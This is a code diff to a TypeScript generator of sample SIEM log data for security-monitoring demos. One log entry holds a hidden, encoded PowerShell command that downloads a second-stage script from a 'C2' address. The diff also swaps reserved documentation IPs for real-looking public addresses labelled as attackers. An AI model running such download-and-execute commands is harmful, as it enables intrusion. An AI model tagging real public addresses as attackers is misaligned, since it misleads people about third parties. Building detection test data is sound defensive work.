@@ -37,7 +37,7 @@ export function generateSampleSIEMLogs(): LogEntry[] {
     });
   };
 
-  // 1. Normal baseline traffic
+  // 1. Normal baseline internal traffic (RFC 1918 Private Subnet)
   for (let i = 0; i < 35; i++) {
     addLog(
       i * 2,
@@ -52,8 +52,8 @@ export function generateSampleSIEMLogs(): LogEntry[] {
     );
   }
 
-  // 2. Incident 1: Brute Force Attack by external IP targeting Administrator
-  const attackerIp = '198.51.100.45';
+  // 2. Incident 1: Brute Force Attack by genuine external attacker IP targeting Administrator
+  const attackerIp = '185.220.101.5';
   for (let i = 0; i < 12; i++) {
     addLog(
       15 + i * 0.25, // Within 3 minutes
@@ -80,7 +80,7 @@ export function generateSampleSIEMLogs(): LogEntry[] {
     { status: 'Success', port: 3389, protocol: 'RDP' }
   );
 
-  // 3. Incident 2: Anomalous Command Execution on the compromised host
+  // 3. Incident 2: Anomalous Command Execution on the compromised internal host
   addLog(
     21,
     '10.0.0.5',
@@ -93,15 +93,16 @@ export function generateSampleSIEMLogs(): LogEntry[] {
     { device: 'SRV-DC-01', status: 'Success' }
   );
 
+  const c2ServerIp = '45.33.32.156';
   addLog(
     23,
     '10.0.0.5',
-    '198.51.100.99',
+    c2ServerIp,
     'Administrator',
     'Process Creation',
     'Suspicious Command',
     'Critical',
-    'powershell.exe -nop -w hidden -EncodedCommand JABjAGwAaQBlAG4AdAAgAD0AIABOAGUAdwAtAE8AYgBqAGUAYwB0AA== downloadstring http://198.51.100.99/stage2.ps1',
+    `powershell.exe -nop -w hidden -EncodedCommand JABjAGwAaQBlAG4AdAAgAD0AIABOAGUAdwAtAE8AYgBqAGUAYwB0AA== downloadstring http://${c2ServerIp}/stage2.ps1`,
     { device: 'SRV-DC-01', port: 8080 }
   );
 
@@ -158,8 +159,8 @@ export function generateSampleSIEMLogs(): LogEntry[] {
     );
   });
 
-  // 6. Incident 5: Suspicious Login / Impossible Travel
-  const travelIps = ['203.0.113.10', '198.51.100.77', '192.0.2.144'];
+  // 6. Incident 5: Suspicious Login / Impossible Travel from distinct public geographic origins
+  const travelIps = ['194.26.29.112', '185.180.143.11', '91.240.118.172'];
   travelIps.forEach((ip, idx) => {
     addLog(
       45 + idx * 3,
